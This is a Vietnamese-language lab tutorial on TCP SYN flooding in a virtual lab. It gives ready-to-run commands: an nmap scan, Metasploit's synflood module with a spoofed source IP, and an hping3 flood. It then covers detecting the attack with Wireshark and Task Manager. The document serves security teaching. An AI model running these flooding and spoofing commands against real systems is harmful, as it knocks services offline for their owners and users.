# SYN Flooding
SYN flood là một hình thức tấn công từ chối dịch vụ trong đó kẻ tấn công gửi một loạt các yêu cầu SYN liên tiếp đến máy mục tiêu nhằm cạn kiệt tài nguyên và khiến nó không phản hồi với lưu lượng hợp lệ đến.

<p align="center">
  <img width="70%" src="https://www.researchgate.net/profile/Pratick_Bakhtiani/publication/304092271/figure/fig4/AS:374545031680000@1466309902047/TCP-SYN-flooding-attack-8.png" />
</p>

Một phiên TCP thiết lập kết nối bằng cơ chế bắt tay ba bước (three-way handshake).Nguồn gửi gói SYN đến đích. Đích, khi nhận gói SYN, phản hồi bằng cách gửi gói SYN/ACK về nguồn. Gói SYN/ACK này xác nhận sự đến của gói SYN đầu tiên cho nguồn. Cuối cùng, nguồn gửi gói ACK cho gói ACK/SYN được gửi bởi đích. Trong tấn công SYN, kẻ tấn công khai thác phương pháp bắt tay ba bước. Đầu tiên, kẻ tấn công gửi một yêu cầu TCP SYN giả đến máy chủ mục tiêu, và khi máy chủ gửi SYN/ACK để phản hồi yêu cầu của client (kẻ tấn công), client không bao giờ gửi phản hồi ACK. Điều này khiến máy chủ chờ đợi để hoàn thành kết nối.

<p align="center">
  <img width="70%" src="https://www.cloudflare.com/img/learning/ddos/syn-flood-ddos-attack/syn-flood-attack-ddos-attack-diagram-1.png" />
</p>

***

### Mục tiêu
* Giả mạo địa chỉ IP của máy tấn công
* Thực hiện SYN Flooding trên máy mục tiêu

### Yêu cầu
* Máy ảo Kali Linux
* Máy ảo Windows 10 (tắt Firewall)
* Máy ảo Windows Server 2012 hoặc 2016

## Kiểm tra cổng mở
Đăng nhập vào Kali Linux và mở một cửa sổ terminal mới.

Chúng ta sẽ thực hiện SYN flooding trên Windows 10 thông qua một **cổng mở**. Để kiểm tra cổng nào đang mở, chúng ta sẽ sử dụng Nmap để quét tất cả các cổng mở.

`nmap -p- <Windows 10 IP address>`

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
```

Trong bài lab này, chúng ta sẽ sử dụng một module auxiliary từ **Metasploit** có tên **synflood** để thực hiện tấn công DoS trên mục tiêu sử dụng cổng 445.

## Thực hiện tấn công DoS
Gõ **msfconsole** để khởi chạy Metasploit Framework.

`msfconsole`

Nhập lệnh để tải module:

`use auxiliary/dos/tcp/synflood`

Để hiển thị tất cả các tùy chọn của module, gõ:

`options`

```
Name       Current Setting  Required  Description
----       ---------------  --------  -----------
INTERFACE                   no        The name of the interface
NUM                         no        Number of SYNs to send (else unlimited)
RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT      80               yes       The target port
SHOST                       no        The spoofable source address (else randomizes)
SNAPLEN    65535            yes       The number of bytes to capture
SPORT                       no        The source port (else randomizes)
TIMEOUT    500              yes       The number of seconds to wait for new data
```

Chúng ta sẽ thay đổi các tham số RHOST, RPORT và SHOST:

`set RHOST [IP address of Windows 10]`
`set RPORT 445`
`set SHOST [IP address of Windows Server]`

Bằng cách đặt tùy chọn **SHOST** thành địa chỉ IP của Windows Server, bạn đang giả mạo địa chỉ IP của máy Kali Linux.

Khi module auxiliary đã được cấu hình, bắt đầu tấn công DoS trên Windows 10 bằng cách gõ:

`run`

![synflood](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9f36f0e0d55c0b7429e547dd93c7c55c55b96ea4/synflood-0.png)

Điều này bắt đầu cuộc tấn công SYN flooding trên Windows 10.

## Kiểm tra cuộc tấn công DoS
Chuyển sang máy Windows 10 và khởi chạy [**Wireshark**](https://www.wireshark.org/), chọn đúng giao diện mạng và nhấp bắt đầu.

Wireshark hiển thị lưu lượng truy cập đến từ máy như hình dưới:

![wireshark-synflood-detect](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9f36f0e0d55c0b7429e547dd93c7c55c55b96ea4/synflood-wireshark-4.png)

Tại đây, bạn có thể quan sát rằng địa chỉ IP nguồn là từ Windows Server. Điều này ngụ ý rằng địa chỉ IP của Kali Linux đã bị giả mạo.

Tiếp theo, mở **Task Manager** trên Windows 10 và nhấp vào tab **performance**.

Bạn sẽ quan sát thấy rằng mức sử dụng CPU và Ethernet đã tăng đáng kể sau cuộc tấn công, điều này ngụ ý rằng cuộc tấn công DoS đang diễn ra. Nếu cuộc tấn công được tiếp tục trong một thời gian, tài nguyên của máy sẽ bị cạn kiệt hoàn toàn và nó sẽ ngừng phản hồi.

![task-manager](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/50372a5d43eb96f78aa8886cb7b3eef9b1d417eb/synflood-task-manager-2.png)

![task-manager-2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9f36f0e0d55c0b7429e547dd93c7c55c55b96ea4/synflood-task-manager-1.png)

Để dừng tấn công DoS, quay lại Metasploit trên Kali và nhấn **Ctrl+C** để chấm dứt tấn công.

# SYN Flooding bằng hping3
hping3 là một công cụ lắp ráp/phân tích gói TCP/IP dòng lệnh.

Để tìm hiểu thêm về **hping3** bạn có thể xem [module này](https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/2-Scanning-Networks/1-hping3.md).

## Thực hiện SYN flooding bằng hping3

`hping3 -S [Windows 10 IP address] -a [Kali IP address] -p 22 --flood`

![syn2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/72394c4deaa152f806930cd26a1e4cf424b3e77a/syn-2.png)

Điều này bắt đầu cuộc tấn công SYN flooding trên Windows 10.

Hping3 tràn ngập máy nạn nhân bằng cách gửi hàng loạt **gói SYN** và **quá tải** tài nguyên nạn nhân.

Chuyển sang Windows 10 và khởi chạy [Wireshark](https://www.wireshark.org/), chọn đúng giao diện mạng và bắt đầu bắt gói tin.

Phân tích lưu lượng đã bắt, bạn sẽ nhận thấy số lượng lớn **gói SYN**, có thể khiến máy mục tiêu bị lỗi.

![wireshark2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/72394c4deaa152f806930cd26a1e4cf424b3e77a/syn-wireshark-2.png)
